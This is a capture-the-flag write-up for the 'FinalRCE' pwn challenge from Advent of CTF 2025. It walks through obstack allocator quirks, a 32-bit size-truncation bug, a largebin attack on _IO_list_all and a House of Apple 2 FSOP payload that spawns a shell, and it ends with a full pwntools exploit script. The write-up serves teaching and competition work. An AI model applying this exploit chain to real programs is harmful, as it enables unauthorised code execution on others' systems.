---
author: acni
title: "pwn/adventofCTF 2025: FinalRCE"
pubDatetime: 2025-12-31
slug: 'pwn-adventofCTF2025-finalrce'
featured: true
description: "objstack pwn, largebin attack"
tags:
  - pwn
---

# Final RCE

This was the last challenge to the Cyberstudents's Advent of CTF. (pwn)


## Objstack Behavior

Objstack works in a different way than just mallocing per object. It allocates a big heap chunk and stores data/heap stuff in the chunk, instead of just mallocing a heap chunk per allocation.

## Objstack malloc

First, objstack mallocs a big heap chunk. Then, if the user requested allocation is smaller than the current heap size left, then the allocation is stored inside the current heap chunk. 
It also doesn't have any metadata/heap stuff.  If the requested allocation fills up the amount of remaining space in the big heap chunk, then objstack mallocs a slightly bigger sized chunk. 
If there is no allocations inside the most recent heap chunk and the user requests a bigger sized chunk than the recent, then that heap chunk is freed and a new, bigger chunk is malloced in
order to store this allocation. Any time the user makes an allocation it also first checks if theres any free chunks to put it in first. 

## Objstack free

Free works in an interesting way. If an allocation is freed and it is the only allocation in a heap chunk, but it is in the most recent heap chunk, then it will just get rid of the chunk altogether. If a chunk that is not the most recent is freed, it deletes all the chunks from top to bottom to get to that chunk again. (Sort of like it is just rewinding to it's previous state.)

# Part 1: Experimenting

When starting this challenge, I had no idea how objstack worked. I still don't have complete knowledge, but full understanding is definitely not needed to understand how to solve the challenge, since the exploit involved traditional heap exploitation anyways. When starting out dealing with an unknown module (like i did with objstack), made sure to use `GDB`, as it is important to examine the heap while allocating and freeing so you can get an understanding of how objstack works. 

First, i wrote the traditional heap function helpers (malloc, free, edit, etc etc)

Then, i started randomly allocating and freeing, then examining the heap state in `pwndbg` to understand how the program worked. Quickly, i figured out:

- First, I could malloc a chunk of 0x1200 size to force a new heap allocation, and free the first malloced chunk into unsortedbin (the one that is automatically made at runtime)

```
<pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5d4bbd934000
Size: 0x290 (with flag bits: 0x291)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5d4bbd934290
Size: 0xff0 (with flag bits: 0xff1)
fd: 0x72f16d5fdcc0
bk: 0x72f16d5fdcc0

Allocated chunk
Addr: 0x5d4bbd935280
Size: 0x1280 (with flag bits: 0x1280)

Top chunk | PREV_INUSE
Addr: 0x5d4bbd936500
Size: 0x1eb00 (with flag bits: 0x1eb01)

```

This was the main logic I was going for: Allocating bigger chunks/freeing chunks in a way so that I could manipulate the heap to do some sort of heap attack.

Since the chunks were so big, a tcache attack would definitely not work in this case, because in order to put a chunk in the tcache the size has to be much smaller (biggest tcache size is 0x410)

What was left? Well, by making another bigger allocation so that objstack makes yet another malloc: 


```
alloc(r, 0, 0x1200, 'R')
alloc(r, 1, 0x1280, 'R')
```

```
<pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x6049b8e07000
Size: 0x290 (with flag bits: 0x291)

Free chunk (largebins) | PREV_INUSE
Addr: 0x6049b8e07290
Size: 0xff0 (with flag bits: 0xff1)
fd: 0x7b455519b2d0
bk: 0x7b455519b2d0
fd_nextsize: 0x6049b8e07290
bk_nextsize: 0x6049b8e07290

Allocated chunk
Addr: 0x6049b8e08280
Size: 0x1280 (with flag bits: 0x1280)

Allocated chunk | PREV_INUSE
Addr: 0x6049b8e09500
Size: 0x1300 (with flag bits: 0x1301)

Top chunk | PREV_INUSE
Addr: 0x6049b8e0a800
Size: 0x1d800 (with flag bits: 0x1d801)
```

I am able to force the unsortedbin into the largebins, allowing for a potential largebin attack. This attack was also hinted towards in Hint 2.

This works because i didn't allocate anything at the start, and objstack premade a chunk that was size 0xff0. Then, I requested an allocation that was bigger than 0xff0, so objstack made a new allocation
to fit this. Because the premade allocation doesn't have any allocations in it, it was freed. 

To make new chunks, I noticed it also created a new allocation of +0x80 size when i filled up the previous allocation. Looking at the past example, I only requested an allocation of 0x1280, which completely
filled up the one objstack malloced. To store future allocs, it made a new size of 0x1300. I could repeat this process to keep making chunks whenever I wanted to.

Using this exploitation logic, you can force malloc chunks easily and also free chunks.


```
alloc(r, 10, 0x10, 'R')
alloc(r, 0, 0x1200, 'R')
free(r, 0)
alloc(r, 1, 0x1280, 'R')
alloc(r, 2, 0x1300, 'R')
free(r, 2)
alloc(r, 3, 0x1380, 'R')
```

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x61b72d53c000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x61b72d53c290
Size: 0xff0 (with flag bits: 0xff1)

Free chunk (largebins) | PREV_INUSE
Addr: 0x61b72d53d280
Size: 0x1280 (with flag bits: 0x1281)
fd: 0x7a1f0390d2f0
bk: 0x7a1f0390d2f0
fd_nextsize: 0x61b72d53d280
bk_nextsize: 0x61b72d53d280

Allocated chunk
Addr: 0x61b72d53e500
Size: 0x1300 (with flag bits: 0x1300)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x61b72d53f800
Size: 0x1380 (with flag bits: 0x1381)
fd: 0x7a1f0390ccc0
bk: 0x7a1f0390ccc0

Allocated chunk <------- created as a result of alloc(0x1380)
Addr: 0x61b72d540b80
Size: 0x1400 (with flag bits: 0x1400)

Top chunk | PREV_INUSE
Addr: 0x61b72d541f80
Size: 0x1b080 (with flag bits: 0x1b081)
```


You can't free 2 chunks that are right next to each other though, otherwise they would consolidate to join one big largebin. (normal freed chunk behavior)

``
Two freed chunks will join together if glibc can prove they are adjacent and freed (using stuff like boundary tags & prev_inuse bit), unless something prevents it (tcache or another allocation between them).
``


```
alloc(r, 10, 0x10, 'R')
alloc(r, 0, 0x1200, 'R')
alloc(r, 1, 0x1280, 'R')
free(r, 1)
alloc(r, 2, 0x1300, 'R')
free(r, 2) <---- This doesn't consolidate with the wilderness bc alloc(0x1300) makes a new allocation 0x1380 size 
alloc(r, 3, 0x1380, 'R')

```

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x580cd79db000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x580cd79db290
Size: 0xff0 (with flag bits: 0xff1)

Allocated chunk | PREV_INUSE
Addr: 0x580cd79dc280
Size: 0x1280 (with flag bits: 0x1281)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x580cd79dd500
Size: 0x2680 (with flag bits: 0x2681) <----- big freed size
fd: 0x7f34fa542cc0
bk: 0x7f34fa542cc0

Allocated chunk
Addr: 0x580cd79dfb80
Size: 0x1400 (with flag bits: 0x1400)

Top chunk | PREV_INUSE
Addr: 0x580cd79e0f80
Size: 0x1b080 (with flag bits: 0x1b081)
```

WIth the ability to create 2 largebins, it was time to execute the largebin attack. This would require:

- Larger largebin already in bin
- Smaller unsortedbin, which would later be pushed to largebin after metadata was altered in prev largebin
- Both in same size range for largebin (predetermined range, around 0x200 size of each other)

What would we overwrite with a largebin attack? I decided to try to get a libc leak and corrupt `_IO_list_all` and do FSOP since i didn't see a way to get PIE base. 

Luckily, if I could read largebin metadata, I would be able to get both a libc leak and be able to modify the bk_nextsize

This is where the second exploitation primitive comes into play here:

## Integer size shenanigans

the allocator math truncates the 64‑bit size to a signed 32‑bit int, letting you allocate backwards anywhere on the heap

  - size is read as `ulong`, but the obstack math uses `(int)uVar3` and `uVar3 & 0xffffffff`.
  - Example - if wanted to move back by 0x1000, neg_size3 = 2^32 - 0x1000 makes (int)neg_size3 == -0x1000, so the space check passes and the obstack pointer moves back by 0x1000.

32‑bit underflow → backward obstack allocation → allows us to overlap with largebin metadata → leak/overwrite

## Libc leak + Editing bk_nextsize

Now, with the ability to move allocations to wherever i wanted, I put 2 allocations on a largebin, which gave me the ability to read the fd/bk pointer, which is stored in libc.

I also placed an allocation on bk_nextsize, so I could edit it to be `_IO_list_all - 0x20` (0x20 comes from largebin attack on 2.36, read poc on `how2heap`)

But before doing all this, we needed to set up the requirements for a largebin attack.

# Part 2: Largebin attack

First, we needed an existing largebin. Then, we need a SMALLER unsortedbin (but still in the same largebin size), so that when it is pushed into the largebin the exploit happens. 

The problem is, objstack only allocates bigger chunks than the previous. 

- If i free a chunk at first, it goes into largebins
- But then when I want to free another chunk, it will always be bigger than the last, since objstack adds +0x80 size to each allocations

In addition, if you objstack_free an earlier allocation, it will simply just delete all the allocations made after that and return to the original state of when that allocation was made

Example:
```
alloc(r, 10, 0x10, 'R')
alloc(r, 0, 0x1200, 'R')
alloc(r, 1, 0x1280, 'R')
alloc(r, 2, 0x1300, 'R')
alloc(r, 3, 0x1380, 'R')
alloc(r, 4, 0x1400, 'R')
alloc(r, 5, 0x1480, 'bro is not cooking')
free(r, 10)
```

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x58fa4a327000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x58fa4a327290
Size: 0xff0 (with flag bits: 0xff1)

Top chunk | PREV_INUSE
Addr: 0x58fa4a328280
Size: 0x1fd80 (with flag bits: 0x1fd81)

```

Yooo where the hell did all those allocations go??? Objstack rewind bro.

So freeing an earlier chunk is definitely off the table. But, the goal is just to make either a smaller or bigger freed chunk than expected. 

Making a smaller freed chunk didn't work for me, since i tried doing this:

```
alloc(r, 3, 0x1380, 'R')
free(r, 3)
alloc(r, 4, 0x1400, 'R')
alloc(r, 5, 0x1200, 'bro is not cooking')
free(r, 5) 
```

although allocing a smaller 0x1200 chunk worked, when i added the free(r, 3), the 0x1200 alloc simply went to that chunk instead, messing up the exploit.

Instead, I used the earlier knowledge of freeing 2 chunks next to each other to make a smaller freed chunk:


```
alloc(r, 4, 0x1480, 'R')
free(r, 4)
alloc(r, 5, 0x1500, 'R')
free(r, 5)
alloc(r, 6, 0x1580, 'R')
alloc(r, 7, 0x1600, 'R')
alloc(r, 8, 0x1680, 'R')
```

When allocing the first chunk, it increases chunksize to 0x1500. Then it frees, and makes a new allocation, making a freed chunk of 0x1480 size
- Then it frees 5 and allocs 6, which makes an unsortedbin size of 0x1480 + 0x1500, also creating an allocation of 0x1600 size. This allocation doesn't go into the unsortedbin or largebin consolidation because
it is bigger than size 0x1480 and 0x1500. 
- Now, the 0x1600 alloc. Since there is now an unsortedbin size of 0x1480 + 0x1500 (0x2980), the next malloc call will go into this total size. Therefore, you can control the size of this unsortedbin by mallocing the right size. 
If I wanted to make the size 0x1380 i would alloc 0x1600 because 0x2980-0x1600 = 0x1380. 
- Finally, the last alloc(0x1680) call pushes it into largebin, since its higher than 0x1380. 

```
Free chunk (largebins) | PREV_INUSE
Addr: 0x56f0837ff600
Size: 0x1380 (with flag bits: 0x1381)
fd: 0x7a952b2e92f0
bk: 0x7a952b2e92f0
fd_nextsize: 0x56f0837ff600
bk_nextsize: 0x56f0837ff600
```

By using this primitive you can control the size of the largebin allocation, making it bigger or smaller. 

However, both largebins have to be in the same largebin chunk. For example, one size range is 0x1400 - 0x15f0. So, just allocate a bigger chunk and then use the primitive to allocate a smaller chunk. 

My allocs: (These are super bad, and definitely can be done better. This were allocations I was using for testing, and didn't care for efficiency)

```
alloc(r, 0, 0x10, b'B') 
alloc(r, 1, 0x1200, b'C')
alloc(r, 2, 0x1280, b'D')
alloc(r, 3, 0x1300, b'E')
free(r, 3)
alloc(r, 4, 0x1380, b'F')
alloc(r, 5, 0x1400, b'G')
alloc(r, 6, 0x1480, b'G')
alloc(r, 7, 0x1500, b'G') 
alloc(r, 8, 0x1580, b'G')
free(r, 8)
alloc(r, 9, 0x1600, b'G')
free(r, 9)
alloc(r, 10, 0x1680, b'G')
alloc(r, 11, 0x1900, b'G')
```

# Part 3: Libc leak + Editing bk_nextsize (for real this time)

```
BACK3 = 0x4320 
neg_size3 = (1 << 32) - BACK3
 
alloc(r, 18, neg_size3, b"P" * 0x10, pad=False)
    
# This allocation should land at the start of  the unsortedbin, which leaks libc when printed. c0 is constant through runs 
alloc(r, 19, 0x301, b"RRRR", pad=False)
```

I used "RRRR" to find where the allocation was landing, and then adjusted the "BACK" value to make it land exactly on the first largebin. 

```
Free chunk (largebins) | PREV_INUSE
Addr: 0x60b26b75a800
Size: 0x1380 (with flag bits: 0x1381)
fd: 0x7a70252e22f0
bk: 0x7a70252e22f0
fd_nextsize: 0x60b26b75a801
bk_nextsize: 0x7a70252e2640
```

I put the allocation exactly on fd, which made the first byte overwrite with the value i put into alloc() since it auto asks for data to put in the allocation. Luckily, the LSB of fd_nextsize and other values is constant throughout runs so I could just hardcode the correct byte into the fake allocation. 

Then, i just called print() on the allocation, giving me a libc leak. 

Then, i did the same for fd_nextsize because I couldn't put the allocation exactly on bk_nextsize (since it is not 0x10 aligned), so i just leaked fd_nextsize so I could overwrite both with edit(). 

(LSB of fd_nextsize is 0x00, but i overwrite with 0x01 because puts() stops at a nullbyte and we wouldn't be able to leak it otherwise. To stop this i just added +0x01 to the libc base calculation.)

Then after leaking fd_nextsize i calculate `_IO_list_all` from the libc address from before and overwrite bk_nextsize

``
_IO_list_all is a global variable that is a crucial target for FSOP attacks because it is the head pointer of the linked list that connects all of the FILE streams and structures in a process. By calling _IO_flush_all_lockp, it iterates through several I/O functions. If _IO_flush_all_lockp is called and _IO_list_all can point to our fake FILE struct on the heap, then it will call it, giving us a shell.
``


Then, i allocate another chunk to move the smaller unsortedbin into largebin, and the exploit happens, overwriting _IO_list_all's value to the heap address of the smaller largebin

```
pwndbg> x/gx &_IO_list_all
0x7a70252e2660 <_IO_list_all>:	0x000060b26b762800 <----- our heap address!
pwndbg>
```

# Part 4: FSOP 

From there, winning is simple. I went with a House of Apple 2 attack, which calls a _IO_wfile_jumps -> _IO_wfile_overflow -> _IO_wdoallocbuf(fp)

from wdoallocbuf, it calls 
```
0x719785b774b4 <_IO_wdoallocbuf+36>:	  mov rax,QWORD PTR [rax+0xe0] (dereferences +0xe0 in _wide_data)
0x719785b774bb <_IO_wdoallocbuf+43>:	call   QWORD PTR [rax+0x68] (calls 0x68 offset)
```
The program will call system, placed at the fake _wide_data + 0x68, giving you a shell.

(for more info look up House of Apple 2, other attacks can work aswell, such as apple 3 (_IO_wfile_underflow_mmap -> __libio_codecvt_in -> DL_CALL_FCT))

```
def build_fake_file(fake_addr):
    cmd = b" /bin/sh -i\x00"
    wide_off = 0x100
    vtable_off = 0x200
    wide_addr = fake_addr + wide_off
    lock_addr = fake_addr + 0x280
    vtable_addr = fake_addr + vtable_off

    fake = bytearray(0x300)
    fake[: len(cmd)] = cmd
    # narrow write state
    fake[0x20:0x28] = p64(0)
    fake[0x28:0x30] = p64(1)
    fake[0x38:0x40] = p64(0)
    fake[0x40:0x48] = p64(0)
    fake[0x68:0x70] = p64(0)
    fake[0x88:0x90] = p64(lock_addr)
    # FILE._wide_data and FILE.vtable
    fake[0xA0:0xA8] = p64(wide_addr)
    fake[0xD8:0xE0] = p64(libc.sym["_IO_wfile_jumps"])
    # FILE._mode (wide)
    fake[0xC0:0xC4] = p32(1)
    # wide_data write state
    fake[wide_off + 0x18 : wide_off + 0x20] = p64(0)
    fake[wide_off + 0x20 : wide_off + 0x28] = p64(1)
    fake[wide_off + 0x30 : wide_off + 0x38] = p64(0)
    fake[wide_off + 0x38 : wide_off + 0x40] = p64(0)
    # wide_data->_wide_vtable
    fake[wide_off + 0xE0 : wide_off + 0xE8] = p64(vtable_addr)
    # fake wide vtable: doallocate -> system
    fake[vtable_off + 0x68 : vtable_off + 0x70] = p64(libc.sym["system"])
    return bytes(fake)
```

# Full Exploit: 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["kitty"]
context.log_level = "debug"


def conn():
    if args.LOCAL:
        if args.LD:
            argv = [ld.path, "--library-path", ".", exe.path]
            env = None
        else:
            argv = [exe.path]
            env = {"LD_LIBRARY_PATH": "."}
        if args.NOPTY:
            r = process(argv, stdin=PIPE, stdout=PIPE, stderr=PIPE, env=env)
        else:
            r = process(argv, env=env)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("ctf.csd.lol", 2024)
        solve_pow(r)

    return r


MENU_PROMPT = b"> "
IDX_PROMPT = b"idx: "
SIZE_PROMPT = b"size: "
DATA_PROMPT = b"data: "
MENU_TAIL = b"0) exit\n"


def alloc(r, idx, size, data):

    r.sendlineafter(MENU_PROMPT, b"1")
    r.sendlineafter(IDX_PROMPT, str(idx).encode())
    r.sendlineafter(SIZE_PROMPT, str(size).encode())
    r.sendafter(DATA_PROMPT, data[:size])


def free(r, idx):
    r.sendlineafter(MENU_PROMPT, b"2")
    r.sendlineafter(IDX_PROMPT, str(idx).encode())


def edit(r, idx, data):
    r.sendlineafter(MENU_PROMPT, b"3")
    r.sendlineafter(IDX_PROMPT, str(idx).encode())
    r.sendafter(DATA_PROMPT, data[:size])


def print(r, idx):
    r.sendlineafter(MENU_PROMPT, b"4")
    r.sendlineafter(IDX_PROMPT, str(idx).encode())


def build_fake_file(fake_addr):
    cmd = b" /bin/sh -i\x00"
    wide_off = 0x100
    vtable_off = 0x200
    wide_addr = fake_addr + wide_off
    lock_addr = fake_addr + 0x280
    vtable_addr = fake_addr + vtable_off

    fake = bytearray(0x300)
    fake[: len(cmd)] = cmd
    # narrow write state
    fake[0x20:0x28] = p64(0)
    fake[0x28:0x30] = p64(1)
    fake[0x38:0x40] = p64(0)
    fake[0x40:0x48] = p64(0)
    fake[0x68:0x70] = p64(0)
    fake[0x88:0x90] = p64(lock_addr)
    # FILE._wide_data and FILE.vtable
    fake[0xA0:0xA8] = p64(wide_addr)
    fake[0xD8:0xE0] = p64(libc.sym["_IO_wfile_jumps"])
    # FILE._mode (wide)
    fake[0xC0:0xC4] = p32(1)
    # wide_data write state
    fake[wide_off + 0x18 : wide_off + 0x20] = p64(0)
    fake[wide_off + 0x20 : wide_off + 0x28] = p64(1)
    fake[wide_off + 0x30 : wide_off + 0x38] = p64(0)
    fake[wide_off + 0x38 : wide_off + 0x40] = p64(0)
    # wide_data->_wide_vtable
    fake[wide_off + 0xE0 : wide_off + 0xE8] = p64(vtable_addr)
    # fake wide vtable: doallocate -> system
    fake[vtable_off + 0x68 : vtable_off + 0x70] = p64(libc.sym["system"])
    return bytes(fake)




def main():
    r = conn()

    FILL_SIZE = 0x1200
    SMALL = 0x100
    BACK = 0x7f90 
    neg_size = (1 << 32) - BACK
    BACK2 = 0x7f80
    neg_size2 = (1 << 32) - BACK2

    log.info("BACK=0x%x neg_size=0x%x", BACK, neg_size)
    alloc(r, 0, 0x10, b'B') 
    alloc(r, 1, FILL_SIZE, b'C')
    alloc(r, 2, 0x1280, b'D')
    alloc(r, 3, 0x1300, b'E')
    free(r, 3)
    alloc(r, 4, 0x1380, b'F')
    alloc(r, 5, 0x1400, b'G')
    alloc(r, 6, 0x1480, b'G')
    alloc(r, 7, 0x1500, b'G') 
    alloc(r, 8, 0x1580, b'G')
    free(r, 8)
    alloc(r, 9, 0x1600, b'G')
    free(r, 9)
    alloc(r, 10, 0x1680, b'G')
    alloc(r, 11, 0x1900, b'G')    

    # here
    
    alloc(r, 13, neg_size, b"D" * 0x10, pad=False)
    alloc(r, 14, 0x40, b"\xf0", pad=False)
    
    
    print(r, 14)
    r.recvuntil("data: ")
    leak = int.from_bytes(r.recvline().strip(), "little") - 0x1d42f0
    log.info(hex(leak))
    libc.address = leak
    io_list_all = libc.sym["_IO_list_all"]
    log.info("_IO_list_all = %s", hex(io_list_all))
    free(r, 13)

    alloc(r, 16, neg_size2, b"D" * 0x10, pad=False)
    alloc(r, 17, 0x40, b"\x01", pad=False)
    print(r, 17)
    r.recvuntil("data: ")
    leak = int.from_bytes(r.recvline().strip(), "little") - 0x3801
    log.info(hex(leak))  
    heap_base = leak
    victim = heap_base + 0x3801
    payload = p64(victim)
    BK_NEXTSIZE_TARGET = io_list_all - 0x20
    payload += p64(BK_NEXTSIZE_TARGET)
    edit(r, 17, payload) 
    free(r, 16)


    alloc(r, 11, 0x1900, b'G')
    edit(r, 8, b'AAAAAAAAAAAAAA')

    BACK3 = 0x4320 
    neg_size3 = (1 << 32) - BACK3
    alloc(r, 18, neg_size3, b"P" * 0x10, pad=False)
    alloc(r, 19, 0x301, b"RRRR", pad=False)
    
    victim = heap_base + 0xb800 
    fake = build_fake_file(victim)
    fake_idx = 19
    log.info(fake)
    edit(r, fake_idx, fake)
    


    r.interactive()

if __name__ == "__main__":
    main()
```
